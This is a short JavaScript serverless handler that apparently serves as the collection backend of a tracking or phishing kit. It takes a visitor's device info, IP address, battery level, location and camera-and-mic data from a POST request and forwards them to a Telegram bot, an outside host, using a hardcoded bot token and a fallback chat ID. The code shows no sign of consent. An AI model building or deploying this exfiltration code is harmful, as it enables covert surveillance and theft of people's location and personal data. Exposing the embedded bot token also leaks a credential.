export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send("Only POST allowed");
  }

  const TELEGRAM_BOT_TOKEN = "7737650968:AAHsvAEaKL5kOCcgQ4RPtyVjeN3-Hl5Aw1k";
  const chatId = req.body.chatId || "7187468717"; // Fallback

  const message = `
Device Info: ${req.body.device}
IP: ${req.body.ip}
Battery: ${req.body.battery}
Location: ${req.body.location}
Camera & Mic: ${req.body.media}
`;

  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  await fetch(telegramUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  });

  res.status(200).json({ status: "sent" });
}
